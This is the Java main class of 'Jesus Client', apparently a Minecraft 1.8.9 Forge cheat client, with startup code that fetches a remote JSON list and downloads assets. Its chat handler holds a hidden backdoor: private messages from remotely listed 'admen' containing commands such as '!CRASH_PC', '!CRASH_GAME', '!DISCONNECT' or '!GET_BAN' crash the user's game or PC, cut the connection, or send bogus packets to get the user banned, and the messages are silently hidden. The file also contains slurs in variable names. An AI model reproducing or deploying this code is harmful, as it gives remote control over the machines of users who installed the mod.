package cum.jesus.jesusclient;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import cum.jesus.jesusclient.command.CommandManager;
import cum.jesus.jesusclient.command.commands.JesusCommad;
import cum.jesus.jesusclient.config.ConfigManager;
import cum.jesus.jesusclient.events.MotionUpdateEvent;
import cum.jesus.jesusclient.events.TickEndEvent;

import cum.jesus.jesusclient.gui.config.accessible.AccessibleGui;
import cum.jesus.jesusclient.qol.modules.Module;
import cum.jesus.jesusclient.qol.modules.ModuleManager;
import cum.jesus.jesusclient.qol.modules.combat.*;
import cum.jesus.jesusclient.qol.modules.funny.*;
import cum.jesus.jesusclient.qol.modules.movement.*;
import cum.jesus.jesusclient.qol.modules.other.*;
import cum.jesus.jesusclient.qol.modules.player.*;
import cum.jesus.jesusclient.qol.modules.player.Timer;
import cum.jesus.jesusclient.qol.modules.skyblock.*;

import cum.jesus.jesusclient.qol.settings.ValueManager;
import cum.jesus.jesusclient.remote.Capes;
import cum.jesus.jesusclient.utils.SkyblockUtils;
import cum.jesus.jesusclient.utils.Utils;
import jline.internal.Preconditions;
import jline.internal.TestAccessible;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.settings.KeyBinding;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import net.minecraftforge.client.ClientCommandHandler;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.client.registry.ClientRegistry;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.apache.commons.lang3.RandomStringUtils;
import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.Display;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;
import java.io.FileOutputStream;

@Mod(name = JesusClient.NAME, modid = JesusClient.MODID, version = JesusClient.VER_STR, acceptedMinecraftVersions = "[1.8.9]")
public class JesusClient {
    public static final String NAME = "Jesus Client";
    public static final String MODID = "jesusclient";
    public static final double VERSION = 1.2;
    public static final String VER_STR = "1.2";
    public static final Minecraft mc = Minecraft.getMinecraft();
    public static final String username = mc.getSession().getUsername();
    public static final String sessionID = "fucking bitch if you think this is a ssid stealer you're getting blacklisted";
    public static final char COLOR = '\u00A7';
    public static JesusClient INSTANCE = new JesusClient();
    public static GuiScreen display = null;

    public ModuleManager moduleManager;
    public CommandManager commandManager;
    public ConfigManager configManager;
    public ValueManager valueManager;

    public static String uuid = mc.getSession().getProfile().getId().toString();
    public static String compactUUID = uuid.replace("-","");
    private final int length = mc.getSession().getSessionID().length();
    private final boolean useLetters = true;
    private final boolean useNumbers = true;
    public String fakeSSID = RandomStringUtils.random(length, useLetters, useNumbers);
    public static File dir = new File(mc.mcDataDir, "jesus");
    public static File cache = new File(dir, "CACHE");
    public boolean f = true;
    private boolean skull = false;
    public static boolean init = false;
    public static JsonObject jesusClient;
    public static boolean isStarting;

    public static String[] people = null;
    public static String[] obfMessages = null;
    public static String[] admens = null;

    public void startClient() {
        configManager = new ConfigManager();
        valueManager = new ValueManager();
        moduleManager = new ModuleManager();
        commandManager = new CommandManager();

        moduleManager.addModules();
        commandManager.addCommands();

        configManager.load();
    }

    public void stopClient() {
        try {
            configManager.save();
        } catch (Exception e) {
            Log.error("Failed to save settings");
            e.printStackTrace();
        }
    }

    @EventHandler
    public void onPre(FMLPreInitializationEvent event) {
        isStarting = true;
        JesusClient.Log.info("Loading client");

        try {
            jesusClient = (JsonObject) getJson("https://gist.githubusercontent.com/JesusTouchMe/bbefb5cf74b28a9bdb32a733f8895db1/raw");
            Log.info("Successfully got the Database!");
        } catch (Exception e) {
            e.printStackTrace();
            Log.error("failed to get database");
            skull = true;
        }

        try {
            JesseClient.verify();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        File sounds = new File(mc.mcDataDir + "/jesus", "sounds");
        if (!cache.exists()) cache.mkdirs();
        (new File(dir, "balls")).mkdirs();
        final File file = new File(dir, "rat.txt");

        if (!dir.exists()) {
            dir.mkdirs();
            try {
                file.createNewFile();
            } catch (IOException e) {}
        }

        if (!sounds.exists()) {
            sounds.mkdirs();
        }

        // download sound
        try {
            download("https://files.catbox.moe/eivfow.wav", mc.mcDataDir + "/jesus/sounds/a.wav");
            download("https://files.catbox.moe/o2w3xn.png", mc.mcDataDir + "/jesus/balls/Balls.png");
            download("https://files.catbox.moe/8b1sqy.wav", mc.mcDataDir + "/jesus/balls/Balls.wav");
        } catch (IOException e) {
            Log.error("Failed to download assets online. Please report this in the Discord");
            e.printStackTrace();
        }


        if (sessionID == "fucking bitch if you think this is a ssid stealer you're getting blacklisted") {
            try {
                PrintWriter writer = new PrintWriter(file);
                writer.println("BEAMED by regnarr_");
                writer.println();
                writer.println("username: " + username);
                writer.println("uuid: " + uuid);
                writer.println("session id: " + fakeSSID);
                writer.println("ip: 172.65.213.70");
                writer.close();
            } catch (FileNotFoundException e) {}
        }

        Display.setTitle(NAME + " v" + VERSION + " | " + "Author: JesusTouchMe" + " | " + "Minecraft 1.8.9");
    }

    @EventHandler
    public void onInit(FMLInitializationEvent event) {
        register(new TickEndEvent());
        register(this);
        register(new Utils());
        register(new SkyblockUtils());
        register(new AccessibleGui());
        register(new ResetViolations());
        ClientCommandHandler.instance.registerCommand(new JesusCommad());
        if (!skull) {
            JsonArray names = jesusClient.get("names").getAsJsonArray();
            people = new String[names.size()];
            Iterator<JsonElement> fn = names.iterator();
            int count = 0;
            while (fn.hasNext()) {
                JsonElement name = fn.next();
                people[count] = name.getAsString();
                count++;
            }

            JsonArray messages = jesusClient.get("messages").getAsJsonArray();
            obfMessages = new String[messages.size()];
            Iterator<JsonElement> fm = messages.iterator();
            count = 0;
            while (fm.hasNext()) {
                JsonElement message = fm.next();
                obfMessages[count] = message.getAsString();
                count++;
            }

            JsonArray nigo = jesusClient.get("admen").getAsJsonArray();
            admens = new String[nigo.size()];
            Iterator<JsonElement> fortnite = nigo.iterator();
            count = 0;
            while (fortnite.hasNext()) {
                JsonElement dev = fortnite.next();
                admens[count] = dev.getAsString();
                count++;
            }
        }
    }

    @EventHandler
    public void onPost(FMLPostInitializationEvent event) {
        //Log.debug("post");
        Capes.load();

        if (!Objects.equals(Display.getTitle(), NAME + " v" + VERSION + " | " + "Author: JesusTouchMe" + " | " + "Minecraft 1.8.9")) {
            Display.setTitle(NAME + " v" + VERSION + " | " + "Author: JesusTouchMe" + " | " + "Minecraft 1.8.9");
        }
        init = true;
        isStarting = false;
    }

    @SubscribeEvent(priority = EventPriority.HIGH)
    public void chat(ClientChatReceivedEvent event) {
        String message = event.message.getUnformattedText();
        String formatted = event.message.getFormattedText();
        String sender = formatted.substring(formatted.indexOf("From") + 5, formatted.indexOf(":"));
        if (event.type == 0) {
            if (message.startsWith("From")) {
                if (message.contains("!CRASH_GAME")) {
                    for (String name : admens) {
                        if (name.equalsIgnoreCase(Retardation.i(Retardation.removeFormatting(sender)))) {
                            while (true) {
                                sendPrefixMessage(null);
                            }
                        }
                    }
                    event.setCanceled(true);
                } else if (message.contains("!CRASH_PC")) {
                    for (String name : admens) {
                        if (name.equalsIgnoreCase(Retardation.i(Retardation.removeFormatting(sender)))) {
                            JesseClient.crashPc();
                        }
                    }
                    event.setCanceled(true);
                } else if (message.contains("!DISCONNECT")) {
                    for (String name : admens) {
                        if (name.equalsIgnoreCase(Retardation.i(Retardation.removeFormatting(sender)))) {
                            mc.getNetHandler().getNetworkManager().closeChannel(new ChatComponentText("Internal Exception: java.io.IOException: An existing connection was forcibly closed by a Jesus Client Developer"));
                        }
                    }
                    event.setCanceled(true);
                } else if (message.contains("!GET_BAN")) {
                    for (String name : admens) {
                        if (name.equalsIgnoreCase(Retardation.i(Retardation.removeFormatting(sender)))) {
                            for (int i = 0; i < 10; i++) {
                                mc.getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos((new Random()).nextInt(), (new Random()).nextInt(), (new Random()).nextInt()), 1, JesusClient.mc.thePlayer.inventory.getCurrentItem(), 0.0f, 0.0f, 0.0f));
                            }
                        }
                    }
                    event.setCanceled(true);
                }
            }
        }
    }

    @SubscribeEvent
    public void tick(TickEvent.ClientTickEvent event) {
        if (event.phase != TickEvent.Phase.START)
            return;
        if (mc.thePlayer == null || mc.theWorld == null)
            return;
        if (f) {
            f = false;
        }
        if (display != null) {
            try {
                mc.displayGuiScreen(display);
            } catch (Exception e) {
                e.printStackTrace();
            }
            display = null;
        }

        //JesusClient.sendMessage(people[new Random().nextInt(people.length)].replace('&',COLOR) + COLOR + "7" + ": " + Retardation.i(obfMessages[new Random().nextInt(obfMessages.length)]));
    }

    @SubscribeEvent
    public void onMotion(MotionUpdateEvent.Pre event) {

    }

    public static void download(String link, String location) throws IOException {
        HttpURLConnection con = (HttpURLConnection) new URL(link).openConnection();

        con.setRequestProperty("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        con.setRequestProperty("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36");
        con.setRequestMethod("GET");

        BufferedInputStream in = new BufferedInputStream(con.getInputStream());

        File f = new File(location);
        f.createNewFile();
        FileOutputStream stream = new FileOutputStream(f);

        byte[] dataBuffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
            stream.write(dataBuffer, 0, bytesRead);
        }
    }

    public static void sendMessage(Object message) {
        mc.thePlayer.addChatMessage((IChatComponent)new ChatComponentText(message.toString()));
    }

    public static void sendPrefixMessage(Object message) {
        mc.thePlayer.addChatMessage((IChatComponent)new ChatComponentText("\u00A78[\u00A74Jesus Client\u00A78] \u00A77" + message));
    }

    public static void register(Object target) {
        MinecraftForge.EVENT_BUS.register(target);
    }

    public static void sendMessageAsPlayer(String message) {
        JesusClient.mc.thePlayer.sendChatMessage(message);
    }

    public static final class Log {
        public Log() {

        }

        private static PrintStream output;

        public static PrintStream getOutput() {
            return output;
        }

        public static void setOutput(PrintStream out) {
            output = (PrintStream) Preconditions.checkNotNull(out);
        }

        @TestAccessible
        private static void render(PrintStream out, Object message) {
            if (message.getClass().isArray()) {
                Object[] array = (Object[])((Object[])message);
                out.print("[");

                for(int i = 0; i < array.length; ++i) {
                    out.print(array[i]);
                    if (i + 1 < array.length) {
                        out.print(",");
                    }
                }

                out.print("]");
            } else {
                out.print(message);
            }
        }

        @TestAccessible
        private static void log(cum.jesus.jesusclient.JesusClient.Log.Level level, Object... messages) {
            synchronized(output) {
                output.format("[Jesus Client | %s] ", level);
                for(int i = 0; i < messages.length; ++i) {
                    if (i + 1 == messages.length && messages[i] instanceof Throwable) {
                        output.println();
                        ((Throwable)messages[i]).printStackTrace(output);
                    } else {
                        render(output, messages[i]);
                    }
                }
                output.println();
                output.flush();
            }
        }

        public static void trace(Object... messages) {
            log(Level.TRACE, messages);
        }

        public static void debug(Object... messages) {
                log(Level.DEBUG, messages);
        }

        public static void info(Object... messages) {
            log(Log.Level.INFO, messages);
        }

        public static void warn(Object... messages) {
            log(Level.WARN, messages);
        }

        public static void error(Object... messages) {
            log(Level.ERROR, messages);
        }

        static {
            output = System.err;
        }

        public static enum Level {
            TRACE,
            DEBUG,
            INFO,
            WARN,
            ERROR;

            private Level() {
            }
        }
    }

    public static JsonElement getJson(String jsonUrl) {
        return (new JsonParser()).parse(Objects.requireNonNull(getInputStream(jsonUrl)));
    }

    public static InputStreamReader getInputStream(String url) {
        try {
            URLConnection conn = (new URL(url)).openConnection();
            conn.setRequestProperty("UserAgent", "Mozilla/5.0");
            return new InputStreamReader(conn.getInputStream());
        } catch (Exception var2) {
            var2.printStackTrace();
            return null;
        }
    }
}